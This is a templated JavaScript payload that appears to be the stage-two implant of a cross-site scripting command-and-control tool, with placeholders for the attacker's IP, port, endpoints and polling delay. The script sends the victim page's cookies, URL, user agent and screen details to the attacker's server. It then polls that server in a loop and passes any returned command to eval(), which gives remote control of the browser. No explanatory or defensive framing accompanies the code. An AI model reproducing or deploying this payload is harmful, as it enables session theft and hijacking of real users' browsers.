stage_2_init = "http://{{IP}}:{{PORT}}{{ENDPOINT_INIT}}/{{UID}}";
stage_2_interact = "http://{{IP}}:{{PORT}}{{ENDPOINT_INTERACT}}/{{UID}}";
//console.log(window.location.href);
//console.log(document.cookie);
j = {url: window.location.href,
    cookie: document.cookie,
    user_agent: window.navigator.userAgent,
    platform: window.navigator.platform,
    screen_resolution: window.screen.width + "x" + window.screen.height,
    browser_size: window.innerWidth + "x" + window.innerHeight
};
fetch(stage_2_init, {
    method: "POST",
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(j)
});

function sleep(delay) {
  return new Promise(res => setTimeout(res, delay));
}

async function fetch_cmd(){
  let r = await fetch(stage_2_interact);
  //console.log(r.status);
  //console.log(r.statusText);

  if (r.status === 200) {
    let data = await r.json();
    //console.log(data)
    //console.log(data["r"])
    cmd = data["r"]
    if (cmd !== "") {
      eval(data["r"]);
    }
  }
}

async function cmd_loop(delay) {
  exit = 1;
  while (exit === 1) {
    let d = fetch_cmd();
    await sleep(delay);
    //console.log("ok");
  };
}

delay = {{DELAY}};
cmd_loop(delay);
